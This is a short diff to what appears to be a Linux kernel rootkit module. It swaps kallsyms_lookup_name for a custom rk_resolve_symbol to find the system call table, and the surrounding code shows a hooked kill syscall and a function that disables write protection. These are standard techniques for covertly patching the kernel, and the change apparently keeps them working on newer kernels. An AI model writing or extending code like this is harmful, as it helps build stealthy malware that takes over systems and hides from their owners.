@@ -1,3 +1,4 @@
+#include "memory_utils.h"
 #include "syscall_hook.h"
 #include <linux/module.h>
 #include <linux/syscalls.h>
@@ -11,7 +12,7 @@ static unsigned long **syscall_table;
 static orig_kill_t real_kill;
 
 static unsigned long **find_syscall_table(void) {
-    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
+    return (unsigned long **)rk_resolve_symbol("sys_call_table");
 }
 
 static void disable_wp(void) {
